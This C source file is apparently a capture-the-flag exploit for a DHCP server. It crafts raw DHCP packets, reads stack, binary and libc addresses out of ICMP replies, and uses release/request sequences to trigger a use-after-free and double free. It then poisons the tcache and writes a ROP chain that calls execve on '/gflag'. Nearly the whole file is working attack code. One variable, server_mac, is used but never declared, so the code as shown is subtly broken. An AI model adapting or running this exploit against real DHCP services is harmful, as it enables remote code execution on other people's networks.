#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
// socket
#include <sys/ioctl.h>
#include <sys/socket.h>
// addr
#include <netinet/in.h> // in_addr, sockaddr_in, ...
#include <arpa/inet.h>  // inet_addr, inet_ntoa, ...
// iface
#include <linux/if_packet.h> // sockaddr_ll
#include <net/if.h>          // ifr_req
// ethernet
#include <net/ethernet.h>
#include <linux/if_ether.h>
// ip
#include <netinet/ip.h>
// udp
#include <netinet/udp.h>
// icmp
#include <netinet/ip_icmp.h>

/*-------- DHCP definations --------*/
#define DHCP_SERVER_PORT 67
#define DHCP_CLIENT_PORT 68
#define DHCP_MAGIC_COOKIE 0x63825363

#define MAX_DHCP_CHADDR_LENGTH 16
#define MAX_DHCP_SNAME_LENGTH 64
#define MAX_DHCP_FILE_LENGTH 128
#define MAX_DHCP_OPTIONS_LENGTH 312

#define BOOTREQUEST 1
#define BOOTREPLY 2

#define DHCPDISCOVER 1
#define DHCPOFFER 2
#define DHCPREQUEST 3
#define DHCPDECLINE 4
#define DHCPACK 5
#define DHCPNACK 6
#define DHCPRELEASE 7
#define DHCPINFORM 8

#define DHCP_OPTION_MESSAGE_TYPE 53
#define DHCP_OPTION_SERVER_IDENTIFIER 54
#define DHCP_OPTION_CLIENT_IDENTIFIER 61
#define DHCP_OPTION_PARAMETER_REQUEST_LIST 55
#define DHCP_OPTION_REQUESTED_IP_ADDRESS 50
#define DHCP_OPTION_END 255

#define ETHERNET_HARDWARE_ADDRESS 1        /* used in htype field of dhcp packet */
#define ETHERNET_HARDWARE_ADDRESS_LENGTH 6 /* length of Ethernet hardware addresses */

typedef struct dhcp_packet
{
    u_int8_t op;                                  /* packet type */
    u_int8_t htype;                               /* type of hardware address for this machine (Ethernet, etc) */
    u_int8_t hlen;                                /* length of hardware address (of this machine) */
    u_int8_t hops;                                /* hops */
    u_int32_t xid;                                /* random transaction id number - chosen by this machine */
    u_int16_t secs;                               /* seconds used in timing */
    u_int16_t flags;                              /* flags */
    struct in_addr ciaddr;                        /* IP address of this machine (if we already have one) */
    struct in_addr yiaddr;                        /* IP address of this machine (offered by the DHCP server) */
    struct in_addr siaddr;                        /* IP address of DHCP server */
    struct in_addr giaddr;                        /* IP address of DHCP relay */
    unsigned char chaddr[MAX_DHCP_CHADDR_LENGTH]; /* hardware address of this machine */
    char sname[MAX_DHCP_SNAME_LENGTH];            /* name of DHCP server */
    char file[MAX_DHCP_FILE_LENGTH];              /* boot file name (used for diskless
                                                     booting?) */
    uint32_t magic_cookie;                        /* DHCP */
    char options[MAX_DHCP_OPTIONS_LENGTH];        /* options */
} dhcp_packet_t;

typedef struct dhcp_req {
    struct sockaddr_in addr_in;
    uint8_t uid_type;
    uint8_t uid[0x100];
    size_t uid_len;
} dhcp_req_t;
/*------ DHCP definations end ------*/

/*-------- UDP checksum calc --------*/
struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
};
/*-------- UDP checksum calc --------*/

int sock = -1;
struct sockaddr_in src_addr_in;
struct sockaddr_in server_addr_in;
struct sockaddr_ll if_addr_ll;
uint32_t xid = 0;

void init(char *iface)
{
    struct ifreq ifr;
    int ret;
    int optval = 1;

    sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0)
    {
        perror("[-] socket: Socket creation failed");
        exit(EXIT_FAILURE);
    }
    printf("[*] Socket creation success.\n");

    memset(&if_addr_ll, 0, sizeof(struct sockaddr_ll));
    if_addr_ll.sll_family = PF_PACKET;
    if ((if_addr_ll.sll_ifindex = if_nametoindex(iface)) == 0)
    {
        perror("if_nametoindex");
        exit(EXIT_FAILURE);
    }

    memcpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFADDR, &ifr) == -1)
    {
        perror("ioctl: get IP addr faild");
        close(sock);
        exit(EXIT_FAILURE);
    }
    memcpy(&src_addr_in, &ifr.ifr_addr, sizeof(struct sockaddr_in));
    printf("[*] %s IP Address: %s\n", iface, inet_ntoa(src_addr_in.sin_addr));

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) == -1)
    {
        perror("ioctl: get MAC addr faild");
        close(sock);
        exit(EXIT_FAILURE);
    }
    memcpy(if_addr_ll.sll_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    printf("[*] %s MAC Address: %02x:%02x:%02x:%02x:%02x:%02x\n", iface,
        if_addr_ll.sll_addr[0], if_addr_ll.sll_addr[1], if_addr_ll.sll_addr[2],
        if_addr_ll.sll_addr[3], if_addr_ll.sll_addr[4], if_addr_ll.sll_addr[5]);

    ret = setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &optval, sizeof(int));
    if (ret != 0)
    {
        perror("[-] setsockopt: Could not set broadcast option on DHCP socket!");
        close(sock);
        exit(EXIT_FAILURE);
    }

    ret = setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int));
    if (ret != 0)
    {
        perror("[-] setsockopt: Could not set reuse address option on DHCP socket!");
        close(sock);
        exit(EXIT_FAILURE);
    }

    srand(time(NULL));
}

unsigned short ip_checksum(unsigned short *buffer, int size) {
    unsigned long cksum = 0;
    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof(unsigned short);
    }
    if (size) {
        cksum += *(unsigned char *)buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (unsigned short)(~cksum);
}

unsigned short udp_checksum(struct iphdr *iph, struct udphdr *udph) {
    struct pseudo_header psh;
    size_t psize = 0;
    uint8_t *buf = NULL;
    size_t udp_len = ntohs(udph->len);

    memset(&psh, 0, sizeof(struct pseudo_header));
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = udph->len;

    psize = sizeof(struct pseudo_header) + udp_len;
    buf = calloc(psize, sizeof(uint8_t));
    memcpy(buf, &psh, sizeof(struct pseudo_header));
    memcpy(buf + sizeof(struct pseudo_header), udph, udp_len);

    return ip_checksum((unsigned short *)buf, sizeof(struct pseudo_header) + udp_len);
}

void create_dhcp_discover_packet(uint8_t *res, size_t *res_len, struct sockaddr_in req_addr_in, _Bool add_param_req_list) {
    dhcp_packet_t *dhcp_pkt = NULL;
    struct ethhdr *ethh;
    struct iphdr *iph;
    struct udphdr *udph;
    uint8_t *buf = NULL;
    size_t buf_len = 0;

    buf = calloc(sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dhcp_packet_t) + 1, sizeof(uint8_t));
    ethh = (struct ethhdr *)buf;
    iph = (struct iphdr *)((char *)ethh + sizeof(struct ethhdr));
    udph = (struct udphdr *)((char *)iph + sizeof(struct iphdr));
    dhcp_pkt = (dhcp_packet_t *)((char *)udph + sizeof(struct udphdr));

    // Ethernet
    memcpy(ethh->h_source, if_addr_ll.sll_addr, ETH_ALEN);
    memset(ethh->h_dest, 0xff, ETH_ALEN);
    ethh->h_proto = htons(ETHERTYPE_IP);

    // IP
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0x10;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dhcp_packet_t));
    iph->ttl = 128;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = INADDR_ANY;
    iph->daddr = INADDR_BROADCAST;
    iph->check = ip_checksum((unsigned short *)iph, sizeof(struct iphdr));

    // UDP
    udph->source = htons(DHCP_CLIENT_PORT);
    udph->dest = htons(DHCP_SERVER_PORT);
    udph->len = htons(sizeof(struct udphdr) + sizeof(dhcp_packet_t));
    udph->check = 0;

    // DHCP Discover
    dhcp_pkt->op = BOOTREQUEST;
    dhcp_pkt->htype = ETHERNET_HARDWARE_ADDRESS;
    dhcp_pkt->hlen = ETHERNET_HARDWARE_ADDRESS_LENGTH;
    dhcp_pkt->xid = htonl(xid);
    memcpy(&dhcp_pkt->chaddr, if_addr_ll.sll_addr, ETH_ALEN);
    dhcp_pkt->magic_cookie = htonl(DHCP_MAGIC_COOKIE);

    size_t i = 0;
    dhcp_pkt->options[i] = DHCP_OPTION_MESSAGE_TYPE; // DHCP Message Type
    dhcp_pkt->options[i + 1] = 1;
    dhcp_pkt->options[i + 2] = DHCPDISCOVER;
    i += 3;

    dhcp_pkt->options[i] = DHCP_OPTION_REQUESTED_IP_ADDRESS; // Requested IP address
    dhcp_pkt->options[i + 1] = 4;
    *(uint32_t *)(&dhcp_pkt->options[i + 2]) = req_addr_in.sin_addr.s_addr;
    i += 6;

    // Parameter Request List
    if (add_param_req_list) {
        memcpy(&dhcp_pkt->options[i], "7\r\001\034\002\003\017\006w\f,/\032y*", 15);
        i += 15;
    }

    dhcp_pkt->options[i] = DHCP_OPTION_END; // End

    udph->check = udp_checksum(iph, udph);

    buf_len = sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dhcp_packet_t);
    memcpy(res, buf, buf_len);
    *res_len = buf_len;

    free(buf);
}

void create_dhcp_request_packet(uint8_t *res, size_t *res_len, dhcp_req_t req) {
    dhcp_packet_t *dhcp_pkt = NULL;
    struct ethhdr *ethh;
    struct iphdr *iph;
    struct udphdr *udph;
    uint8_t *buf = NULL;
    size_t buf_len = 0;

    buf = calloc(sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dhcp_packet_t) + 1, sizeof(uint8_t));
    ethh = (struct ethhdr *)buf;
    iph = (struct iphdr *)((char *)ethh + sizeof(struct ethhdr));
    udph = (struct udphdr *)((char *)iph + sizeof(struct iphdr));
    dhcp_pkt = (dhcp_packet_t *)((char *)udph + sizeof(struct udphdr));

    // Ethernet
    memset(ethh->h_dest, 0xff, ETH_ALEN);
    memcpy(ethh->h_source, if_addr_ll.sll_addr, ETH_ALEN);
    ethh->h_proto = htons(ETHERTYPE_IP);

    // IP
    iph->version = 4;
    iph->ihl = 5;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dhcp_packet_t));
    iph->ttl = 128;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = INADDR_ANY;
    iph->daddr = INADDR_BROADCAST;
    iph->check = ip_checksum((unsigned short *)iph, sizeof(struct iphdr));

    // UDP
    udph->source = htons(DHCP_CLIENT_PORT);
    udph->dest = htons(DHCP_SERVER_PORT);
    udph->len = htons(sizeof(struct udphdr) + sizeof(dhcp_packet_t));
    udph->check = 0;

    // DHCP Discover
    dhcp_pkt->op = BOOTREQUEST;
    dhcp_pkt->htype = ETHERNET_HARDWARE_ADDRESS;
    dhcp_pkt->hlen = ETHERNET_HARDWARE_ADDRESS_LENGTH;
    dhcp_pkt->xid = htonl(xid);
    memcpy(&dhcp_pkt->chaddr, if_addr_ll.sll_addr, ETH_ALEN);
    dhcp_pkt->magic_cookie = htonl(DHCP_MAGIC_COOKIE);

    size_t i = 0;
    dhcp_pkt->options[i] = DHCP_OPTION_MESSAGE_TYPE; // DHCP Message Type
    dhcp_pkt->options[i + 1] = 1;
    dhcp_pkt->options[i + 2] = DHCPREQUEST;
    i += 3;

    dhcp_pkt->options[i] = DHCP_OPTION_SERVER_IDENTIFIER; // Server Identifier
    dhcp_pkt->options[i + 1] = 4;
    *(uint32_t *)(&dhcp_pkt->options[i + 2]) = server_addr_in.sin_addr.s_addr;
    i += 6;

    dhcp_pkt->options[i] = DHCP_OPTION_CLIENT_IDENTIFIER; // Client Identifier
    dhcp_pkt->options[i + 1] = req.uid_len+1;  // len
    dhcp_pkt->options[i + 2] = req.uid_type;   // type
    memcpy(&dhcp_pkt->options[i + 3], req.uid, req.uid_len);
    i += req.uid_len+3;

    dhcp_pkt->options[i] = DHCP_OPTION_REQUESTED_IP_ADDRESS; // Requested IP address
    dhcp_pkt->options[i + 1] = 4;
    *(uint32_t *)(&dhcp_pkt->options[i + 2]) = req.addr_in.sin_addr.s_addr;
    i += 6;

    // Parameter Request List
    memcpy(&dhcp_pkt->options[i], "7\r\001\034\002\003\017\006w\f,/\032y*", 15);
    i += 15;

    dhcp_pkt->options[i] = DHCP_OPTION_END; // End

    udph->check = udp_checksum(iph, udph);

    buf_len = sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dhcp_packet_t);
    memcpy(res, buf, buf_len);
    *res_len = buf_len;

    free(buf);
}

void create_dhcp_release_packet(uint8_t *res, size_t *res_len, dhcp_req_t req) {
    dhcp_packet_t *dhcp_pkt = NULL;
    struct ethhdr *ethh;
    struct iphdr *iph;
    struct udphdr *udph;
    uint8_t *buf = NULL;
    size_t buf_len = 0;

    buf = calloc(sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dhcp_packet_t) + 1, sizeof(uint8_t));
    ethh = (struct ethhdr *)buf;
    iph = (struct iphdr *)((char *)ethh + sizeof(struct ethhdr));
    udph = (struct udphdr *)((char *)iph + sizeof(struct iphdr));
    dhcp_pkt = (dhcp_packet_t *)((char *)udph + sizeof(struct udphdr));

    // Ethernet
    memcpy(ethh->h_dest, server_mac, ETH_ALEN);
    memcpy(ethh->h_source, if_addr_ll.sll_addr, ETH_ALEN);
    ethh->h_proto = htons(ETHERTYPE_IP);

    // IP
    iph->version = 4;
    iph->ihl = 5;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dhcp_packet_t));
    iph->ttl = 128;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = req.addr_in.sin_addr.s_addr;
    iph->daddr = server_addr_in.sin_addr.s_addr;
    iph->check = ip_checksum((unsigned short *)iph, sizeof(struct iphdr));

    // UDP
    udph->source = htons(DHCP_CLIENT_PORT);
    udph->dest = htons(DHCP_SERVER_PORT);
    udph->len = htons(sizeof(struct udphdr) + sizeof(dhcp_packet_t));
    udph->check = 0;

    // DHCP Discover
    dhcp_pkt->op = BOOTREQUEST;
    dhcp_pkt->htype = ETHERNET_HARDWARE_ADDRESS;
    dhcp_pkt->hlen = ETHERNET_HARDWARE_ADDRESS_LENGTH;
    dhcp_pkt->xid = htonl(xid);
    dhcp_pkt->ciaddr = req.addr_in.sin_addr;
    memcpy(&dhcp_pkt->chaddr, if_addr_ll.sll_addr, ETH_ALEN);
    dhcp_pkt->magic_cookie = htonl(DHCP_MAGIC_COOKIE);

    size_t i = 0;
    dhcp_pkt->options[i] = DHCP_OPTION_MESSAGE_TYPE; // DHCP Message Type
    dhcp_pkt->options[i + 1] = 1;
    dhcp_pkt->options[i + 2] = DHCPRELEASE;
    i += 3;

    dhcp_pkt->options[i] = DHCP_OPTION_SERVER_IDENTIFIER; // Server Identifier
    dhcp_pkt->options[i + 1] = 4;
    *(uint32_t *)(&dhcp_pkt->options[i + 2]) = server_addr_in.sin_addr.s_addr;
    i += 6;

    dhcp_pkt->options[i] = DHCP_OPTION_CLIENT_IDENTIFIER; // Client Identifier
    dhcp_pkt->options[i + 1] = req.uid_len+1;  // len
    dhcp_pkt->options[i + 2] = req.uid_type;   // type
    memcpy(&dhcp_pkt->options[i + 3], req.uid, req.uid_len);
    i += req.uid_len+3;

    dhcp_pkt->options[i] = DHCP_OPTION_END; // End

    udph->check = udp_checksum(iph, udph);

    buf_len = sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dhcp_packet_t);
    memcpy(res, buf, buf_len);
    *res_len = buf_len;

    free(buf);
}

void create_dhcp_inform_packet(uint8_t *res, size_t *res_len, dhcp_req_t req) {
    dhcp_packet_t *dhcp_pkt = NULL;
    struct ethhdr *ethh;
    struct iphdr *iph;
    struct udphdr *udph;
    uint8_t *buf = NULL;
    size_t buf_len = 0;

    buf = calloc(sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dhcp_packet_t) + 1, sizeof(uint8_t));
    ethh = (struct ethhdr *)buf;
    iph = (struct iphdr *)((char *)ethh + sizeof(struct ethhdr));
    udph = (struct udphdr *)((char *)iph + sizeof(struct iphdr));
    dhcp_pkt = (dhcp_packet_t *)((char *)udph + sizeof(struct udphdr));

    // Ethernet
    memcpy(ethh->h_dest, server_mac, ETH_ALEN);
    memcpy(ethh->h_source, if_addr_ll.sll_addr, ETH_ALEN);
    ethh->h_proto = htons(ETHERTYPE_IP);

    // IP
    iph->version = 4;
    iph->ihl = 5;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dhcp_packet_t));
    iph->ttl = 128;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = req.addr_in.sin_addr.s_addr;
    iph->daddr = server_addr_in.sin_addr.s_addr;
    iph->check = ip_checksum((unsigned short *)iph, sizeof(struct iphdr));

    // UDP
    udph->source = htons(DHCP_CLIENT_PORT);
    udph->dest = htons(DHCP_SERVER_PORT);
    udph->len = htons(sizeof(struct udphdr) + sizeof(dhcp_packet_t));
    udph->check = 0;

    // DHCP Discover
    dhcp_pkt->op = BOOTREQUEST;
    dhcp_pkt->htype = ETHERNET_HARDWARE_ADDRESS;
    dhcp_pkt->hlen = ETHERNET_HARDWARE_ADDRESS_LENGTH;
    dhcp_pkt->xid = htonl(xid);
    dhcp_pkt->ciaddr = req.addr_in.sin_addr;
    memcpy(&dhcp_pkt->chaddr, if_addr_ll.sll_addr, ETH_ALEN);
    dhcp_pkt->magic_cookie = htonl(DHCP_MAGIC_COOKIE);

    size_t i = 0;
    dhcp_pkt->options[i] = DHCP_OPTION_MESSAGE_TYPE; // DHCP Message Type
    dhcp_pkt->options[i + 1] = 1;
    dhcp_pkt->options[i + 2] = DHCPINFORM;
    i += 3;

    dhcp_pkt->options[i] = DHCP_OPTION_SERVER_IDENTIFIER; // Server Identifier
    dhcp_pkt->options[i + 1] = 4;
    *(uint32_t *)(&dhcp_pkt->options[i + 2]) = server_addr_in.sin_addr.s_addr;
    i += 6;

    dhcp_pkt->options[i] = DHCP_OPTION_CLIENT_IDENTIFIER; // Client Identifier
    dhcp_pkt->options[i + 1] = req.uid_len+1;  // len
    dhcp_pkt->options[i + 2] = req.uid_type;   // type
    memcpy(&dhcp_pkt->options[i + 3], req.uid, req.uid_len);
    i += req.uid_len+3;

    dhcp_pkt->options[i] = DHCP_OPTION_REQUESTED_IP_ADDRESS; // Requested IP address
    dhcp_pkt->options[i + 1] = 4;
    *(uint32_t *)(&dhcp_pkt->options[i + 2]) = req.addr_in.sin_addr.s_addr;
    i += 6;

    // Parameter Request List
    memcpy(&dhcp_pkt->options[i], "7\r\001\034\002\003\017\006w\f,/\032y*", 15);
    i += 15;

    dhcp_pkt->options[i] = DHCP_OPTION_END; // End

    udph->check = udp_checksum(iph, udph);

    buf_len = sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dhcp_packet_t);
    memcpy(res, buf, buf_len);
    *res_len = buf_len;

    free(buf);
}

ssize_t send_raw_pkt(uint8_t *buf, size_t buf_len) {
    ssize_t res = 0;
    res = sendto(sock, buf, buf_len, 0, (struct sockaddr *)&if_addr_ll, sizeof(if_addr_ll));
    if (res < 0) {
        perror("sendto");
        close(sock);
        exit(EXIT_FAILURE);
    }
    printf("[*] send 0x%lx bytes.\n", res);
    return res;
}

ssize_t receive_raw_pkt(uint8_t *buf, size_t buf_len) {
    ssize_t res = 0;

    res = recvfrom(sock, buf, buf_len, 0, NULL, NULL);
    if (res <= 0) {
        perror("recvfrom");
        close(sock);
        exit(EXIT_FAILURE);
    }
    printf("[*] recv 0x%lx bytes.\n", res);
    return res;
}

void hex_dump64(void* buf, size_t len) {
    uint64_t *p = (uint64_t *)buf;
    uint8_t *end = (uint8_t *)buf + len;

    puts("=====================================");
    if (len >= 0x10) {
        for (; (uint8_t *)(p+2) <= end; p+=2) {
            printf("0x%016lx 0x%016lx\n", p[0], p[1]);
        }
    }
    if (len % 0x10 >= 8) {
        printf("0x%016lx ", p[0]);
        if (len % 0x10 == 8) {
            putchar('\n');
            return;
        }
        p += 1;
    }
    if (len % 8 > 0) {
        uint64_t tmp = 0;
        for (size_t i = len % 8; i > 0; i--) {
            tmp |= p[i];
            tmp <<= 8;
        }
        printf("0x%016lx\n", tmp);
    }
    puts("=====================================");
}

_Bool is_icmp_echorequest(uint8_t *buf, size_t buf_len) {
    struct ethhdr *ethh = NULL;
    struct iphdr *iph = NULL;
    struct icmphdr *icmph = NULL;

    if (buf_len < sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct icmphdr))
        return 0;

    ethh = (struct ethhdr *)buf;
    iph = (struct iphdr *)(buf + sizeof(struct ethhdr));
    icmph = (struct icmphdr *)((uint8_t *)iph + sizeof(struct iphdr));

    // return (memcmp(ethh->h_dest, if_addr_ll.sll_addr, ETH_ALEN) == 0)
    return (!memcmp(ethh->h_dest, "\xff\xff\xff\xff\xff\xff", ETH_ALEN))
        && (iph->protocol == IPPROTO_ICMP) 
        && (icmph->type == ICMP_ECHO);
}

uint64_t libc_base = 0,
         elf_base = 0,
         stack_addr = 0;

void leak() {
    uint8_t *buf = NULL;
    size_t buf_len = 0;

    buf = malloc(0x1000);

    do {
        sleep(2);
        xid = random();
        memset(buf, 0, 0x1000);
        create_dhcp_discover_packet(buf, &buf_len, src_addr_in, 0);
        send_raw_pkt(buf, buf_len);

        memset(buf, 0, 0x1000);
        do {
            buf_len = receive_raw_pkt(buf, 0x1000);
        } while (!is_icmp_echorequest(buf, buf_len));
        hex_dump64(buf, buf_len);
        stack_addr = *(uint64_t *)(buf + 0x32);
        elf_base = *(uint64_t *)(buf + 0x3a) - 0x1c168;
    } while (stack_addr < 0x7f0000000000);

    sleep(2);
    xid = random();
    memset(buf, 0, 0x1000);
    create_dhcp_discover_packet(buf, &buf_len, src_addr_in, 1);
    send_raw_pkt(buf, buf_len);

    memset(buf, 0, 0x1000);
    do {
        buf_len = receive_raw_pkt(buf, 0x1000);
    } while (!is_icmp_echorequest(buf, buf_len));
    hex_dump64(buf, buf_len);
    libc_base = *(uint64_t *)(buf + 0x3a) - 0x9a0b1;

    server_addr_in.sin_addr.s_addr = *(uint32_t *)(buf + 0x1a);
    printf("[*] Server IP Address: %s\n", inet_ntoa(server_addr_in.sin_addr));
    memcpy(server_mac, buf + 6, ETH_ALEN);
    printf("[*] Server MAC Address: %02x:%02x:%02x:%02x:%02x:%02x\n",
           server_mac[0], server_mac[1], server_mac[2],
           server_mac[3], server_mac[4], server_mac[5]);
    
    printf("[+] leak libc_base: %p\n", (void *)libc_base);
    printf("[+] leak elf_base: %p\n", (void *)elf_base);
    printf("[+] leak stack_addr: %p\n", (void *)stack_addr);
    free(buf);
}

void exploit() {
    uint8_t *buf = NULL;
    size_t buf_len = 0;
    dhcp_req_t req[4] = { 0, };
    dhcp_req_t tmp_req = { 0, };

    buf = malloc(0x1000);
    for (size_t i = 0; i < 3; i++) {
        req[i].addr_in.sin_addr.s_addr = src_addr_in.sin_addr.s_addr + htonl(i+1);
        req[i].uid_type = 0;
        memset(req[i].uid, '0'+i, 0x47);
        req[i].uid_len = strlen(req[i].uid);
    }

    // malloc 0x50 chunk0-2
    for (size_t i = 0; i < 3; i++) {
        sleep(3);
        xid = random();
        memset(buf, 0, 0x1000);
        create_dhcp_request_packet(buf, &buf_len, req[i]);
        send_raw_pkt(buf, buf_len);
    }
    printf("[*] alloc 0x50 chunks.\n");
    
    // free chunk0
    sleep(3);
    xid = random();
    memset(buf, 0, 0x1000);
    create_dhcp_release_packet(buf, &buf_len, req[0]);
    send_raw_pkt(buf, buf_len);
    printf("[*] free chunk0.\n");

    // alloc and free chunk0 (UAF)
    sleep(3);
    xid = random();
    memset(buf, 0, 0x1000);
    create_dhcp_request_packet(buf, &buf_len, req[0]);
    send_raw_pkt(buf, buf_len);

    // free chunk0 (double free)
    sleep(3);
    xid = random();
    memset(buf, 0, 0x1000);
    create_dhcp_release_packet(buf, &buf_len, req[0]);
    send_raw_pkt(buf, buf_len);
    printf("[*] free chunk0.\n");

    // fake 0x50 tcache next
    memset(&tmp_req, 0, sizeof(dhcp_req_t));
    tmp_req.addr_in.sin_addr.s_addr = req[2].addr_in.sin_addr.s_addr;
    tmp_req.uid_len = 0x47;

    uint64_t ret_addr = stack_addr - 0x20;
    tmp_req.uid_type = ret_addr&0xff;
    *(uint64_t *)tmp_req.uid = ret_addr>>8;
    
    for (size_t i = 0; i < 2; i++) {
        sleep(3);
        xid = random();
        memset(buf, 0, 0x1000);
        create_dhcp_inform_packet(buf, &buf_len, tmp_req);
        send_raw_pkt(buf, buf_len);
    }
    printf("[*] alloc chunk0, fake next.\n");
    // printf("Enter to continue...");
    // getchar();

    // write rop
    uint64_t prdi = elf_base + 0x0000000000019d21,
             prsi = elf_base + 0x000000000001b954,
             prdx = elf_base + 0x00000000000bc28e;
    uint64_t execve_plt = elf_base + 0x0000000000019308;
    // char *cmd = "/usr/bin/xcalc";
    char *cmd = "/gflag";
    uint64_t rop[0x48/8] = {
        prdi, ret_addr + 0x38,
        prsi, 0,
        prdx, 0,
        execve_plt,
        0, 0
    };
    memcpy(&rop[7], cmd, strlen(cmd));

    memset(tmp_req.uid, 0, sizeof(tmp_req.uid));
    tmp_req.uid_type = *(uint8_t *)rop;
    memcpy(tmp_req.uid, (uint8_t *)rop + 1, 0x47);
    sleep(3);
    xid = random();
    memset(buf, 0, 0x1000);
    create_dhcp_inform_packet(buf, &buf_len, tmp_req);
    send_raw_pkt(buf, buf_len);

    free(buf);
}

int main(int argc, char *argv[]) {
    if (argc != 2)
    {
        printf("Usage: sudo %s <iface>\n", argv[0]);
        return 0;
    }
    init(argv[1]);

    leak();
    exploit();

    close(sock);
    return 0;
}
